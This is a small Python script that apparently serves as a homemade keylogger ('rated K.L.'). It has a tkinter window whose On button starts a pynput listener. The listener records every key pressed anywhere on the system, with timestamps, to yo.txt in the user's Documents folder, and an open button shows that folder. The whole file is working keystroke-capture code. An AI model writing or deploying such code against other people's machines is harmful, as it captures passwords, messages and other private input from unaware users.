from tkinter import *
import webbrowser
import os 
from functools import partial
from pynput import keyboard
from datetime import datetime

default_path = os.path.expanduser('~')+'\\Documents'

def key_press(rem):
	# print(key)
	os.chdir(default_path)
	with open('yo.txt','a') as file:
		file.write(str(rem)+' --> '+str(datetime.now())+'\n')
# print(datetime.now())


def starting():
	l = keyboard.Listener(on_press = key_press)
	l.start()
# import time
# print(time.time())

window = Tk()
window.geometry('300x80+1000+800')
window.title('rated K.L.')

B1 = Button(window,text = 'On',font = ('LED',14,'bold'))
B1.pack(side = LEFT)

# def yo():
# # def yo(state):
# 		# global state
# 	# if state == 'pressed':
# 	t = B1['text']
# 	# print()
# 	if t == 'working':
# 		B1.config(text = 'Not working',bg = 'red')
# 	else:
# 		# print('button pressed with state ',e)
# 		B1.config(text = 'working',bg = 'green', relief = 'sunken')
# 		starting()
new = 'on'
def act():
	global new
	# print('now new is ',new)
	if new == 'on':
		starting()
		new = 'k.o.'

	B1.config(text = 'Active',bg = 'green', relief = 'sunken')


# B1.config(command = partial(yo,'pressed'))
B1.config(command = act)
# B1.config(command = yo)

l1 = Label(text = 'Click ON Button to start')
l1.pack(side = BOTTOM)
B2 = Button(window,text = 'quit',bg = 'red', font = ('LED',10,'bold'))
B2.pack(side = RIGHT)
B2.config(command = window.destroy)

def op():
	webbrowser.open(default_path)
B3 = Button(window,text = 'open', font = ('LED',10,'bold'))
B3.pack(side = RIGHT)
B3.config(command = op)